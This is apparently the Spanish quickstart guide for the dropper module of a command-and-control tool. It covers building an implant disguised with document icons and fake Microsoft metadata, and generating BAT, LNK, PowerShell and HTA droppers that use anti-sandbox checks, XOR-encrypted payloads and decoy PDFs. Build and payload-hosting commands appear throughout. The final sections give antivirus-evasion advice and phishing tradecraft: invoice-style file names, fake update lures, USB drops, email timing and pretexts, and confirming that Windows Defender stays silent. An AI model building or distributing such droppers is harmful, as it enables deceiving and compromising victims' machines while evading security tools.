#  Sistema de Iconos y Droppers - Resumen Ejecutivo

##  ¿Qué se implementó?

### 1. Sistema de Iconos Integrados
-  **build.rs mejorado**: Añade icono y metadatos al compilar
-  **download_icon.py**: Descarga iconos de alta calidad (7 tipos)
-  **Metadatos falsos**: Ejecutable parece de Microsoft Corporation

### 2. Generadores de Droppers
-  **simple_dropper.bat**: Dropper BAT básico con PDF decoy
-  **advanced_dropper.ps1**: PowerShell con anti-sandbox y XOR
-  **generate_lnk.ps1**: Genera shortcuts con icono personalizado
-  **builder.py**: Generador automático (BAT/PS1/HTA)

### 3. Automatización
-  **build_with_icon.ps1**: Script todo-en-uno
  - Descarga icono
  - Compila agent
  - Ejecuta pruebas
  - Genera droppers

### 4. Testing
-  **test_droppers.py**: 15 pruebas unitarias
  - Validación de sintaxis
  - XOR encryption/decryption
  - Anti-sandbox checks
  - Integración con build system

---

##  Uso Rápido

### Compilar con Icono de PDF
```powershell
cd e:\repos\C2R2-v2\dropper
.\build_with_icon.ps1 -IconType pdf -Release
```

### Generar Dropper LNK (Más Sigiloso)
```powershell
.\build_with_icon.ps1 -IconType pdf -DropperType lnk -PayloadURL "http://192.168.1.100:8000/agent.exe"
```

### Generar Todos los Droppers
```powershell
.\build_with_icon.ps1 -IconType pdf -DropperType all -Release
```

---

##  Resultados

### Icono Integrado
 Agent.exe ahora tiene:
- **Icono personalizado** (PDF, Word, Excel, etc.)
- **Metadatos falsos**:
  - Compañía: Microsoft Corporation
  - Producto: Windows Security Health Service
  - Versión: 10.0.22621.1
  - Copyright: © Microsoft Corporation

### Droppers Generados (en `dropper/output/`)
-  `Factura_2024.pdf.bat` - BAT con PDF decoy
-  `Documento.pdf.lnk` - LNK con icono de PDF
-  `documento.ps1` - PowerShell encriptado
-  `documento.hta` - HTML Application para phishing

---

##  Ventajas de Seguridad

### Evasión de AV Mejorada
1. **Icono Legítimo**: Ejecutable parece documento PDF/Word
2. **Metadatos Falsos**: Propiedades muestran "Microsoft Corporation"
3. **Droppers Variados**: LNK menos detectado que EXE directo
4. **Anti-Sandbox**: Droppers verifican RAM, uptime, procesos
5. **XOR Encryption**: Payload encriptado en memoria

### Social Engineering
-  **Realismo**: Iconos de alta calidad (256x256)
-  **Contexto**: Nombres apropiados (Factura, Contrato, etc.)
-  **Decoy**: Abre documento real para distraer

---

##  Estructura del Directorio

```
dropper/
├── README.md                    # Documentación del sistema
├── ICON_USAGE_GUIDE.md         # Guía completa de uso
├── QUICKSTART.md               # Este archivo
│
├── builder.py                   # Generador automático de droppers
├── download_icon.py            # Descargador de iconos
├── test_droppers.py            # Suite de pruebas unitarias
│
├── build_with_icon.ps1         #  SCRIPT TODO-EN-UNO
├── generate_lnk.ps1            # Generador de LNK
├── simple_dropper.bat          # Template BAT
├── advanced_dropper.ps1        # Template PowerShell
│
└── output/                     # Droppers generados
    ├── Factura_2024.pdf.bat
    ├── Documento.pdf.lnk
    ├── documento.ps1
    └── documento.hta
```

---

##  Pruebas Unitarias

### Ejecutar Pruebas
```powershell
cd e:\repos\C2R2-v2\dropper
python test_droppers.py
```

### Cobertura de Pruebas
-  Generación de nombres aleatorios
-  XOR encryption/decryption
-  Sintaxis de BAT/PS1/HTA
-  Integración con build.rs
-  Anti-sandbox features
-  User-Agent spoofing

### Resultado Esperado
```
======================================================================
RESUMEN
======================================================================
Pruebas ejecutadas: 15
Exitosas: 14
Fallidas: 0
Errores: 0
Saltadas: 1
```

---

##  Iconos Disponibles

| Tipo | Uso Recomendado | Ejemplo |
|------|-----------------|---------|
| **pdf** | Facturas, contratos | `Factura_2024.pdf.lnk` |
| **word** | Documentos, CV | `Curriculum_Vitae.docx.lnk` |
| **excel** | Presupuestos, reportes | `Presupuesto_Q4.xlsx.lnk` |
| **folder** | USB drops | `Confidencial.lnk` |
| **windows** | Actualizaciones falsas | `WindowsUpdate.lnk` |
| **chrome** | Extensiones falsas | `ChromeSetup.lnk` |
| **edge** | Similar a Chrome | `EdgeUpdate.lnk` |

---

##  Troubleshooting Rápido

### Problema: Python no encontrado
```powershell
winget install Python.Python.3.11
```

### Problema: Pillow no instalado
```powershell
pip install pillow requests
```

### Problema: Icono no aparece en EXE
```powershell
# Verificar que icon.ico existe
Test-Path e:\repos\C2R2-v2\agent\icon.ico

# Recompilar limpiando cache
cd e:\repos\C2R2-v2\agent
cargo clean
cargo build --release
```

### Problema: Dropper detectado por AV
- Usar **LNK** en vez de BAT
- Hostear en dominio legítimo (AWS, GCS)
- Cambiar nombres de variables
- Aumentar delays

---

##  Próximos Pasos

### 1. Compilar y Probar
```powershell
# Compilar con icono
.\build_with_icon.ps1 -IconType pdf -Release

# Verificar resultado
ls ..\agent\target\release\agent.exe
```

### 2. Generar Droppers
```powershell
# Generar LNK (recomendado)
.\build_with_icon.ps1 -IconType pdf -DropperType lnk
```

### 3. Configurar Servidor
```powershell
# Terminal 1: C2 Server
cd e:\repos\C2R2-v2\c2r2-server
cargo run

# Terminal 2: HTTP Server para payloads
cd ..\agent\target\release
python -m http.server 8000
```

### 4. Distribuir
```powershell
# Copiar dropper generado
cd e:\repos\C2R2-v2\dropper\output
ls *.lnk

# Enviar por email / USB / etc.
```

---

##  Recursos Adicionales

### Documentación
- `ICON_USAGE_GUIDE.md` - Guía completa con ejemplos
- `README.md` - Overview del sistema
- Comentarios en código fuente

### Herramientas Recomendadas
- **Resource Hacker**: Ver/editar iconos de EXE
- **CFF Explorer**: Inspeccionar PE headers
- **Sysinternals Suite**: Analizar comportamiento

### Links Útiles
- [Icon Archive](https://iconarchive.com/) - Iconos gratuitos
- [Windows PE Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [LNK File Format](https://github.com/libyal/liblnk/blob/main/documentation/Windows%20Shortcut%20File%20(LNK)%20format.asciidoc)

---

##  Tips Pro

1. **Nombres Realistas**:
   -  `Factura_Empresa_Nov_2024.pdf.lnk`
   -  `malware.exe.lnk`

2. **Timing de Distribución**:
   - Lunes por la mañana (emails de trabajo)
   - Fin de mes (facturas)

3. **Contexto Social**:
   - Email corporativo (no gmail)
   - Firma profesional
   - Pretexto creíble

4. **Testing Previo**:
   - Probar en VM Windows limpia
   - Verificar que no salte Windows Defender
   - Comprobar que el decoy se abre

---

**¿Listo para empezar?** Ejecuta:
```powershell
.\build_with_icon.ps1 -IconType pdf -DropperType all -Release
```

 **Resultado**: Agent compilado con icono + 4 tipos de droppers generados
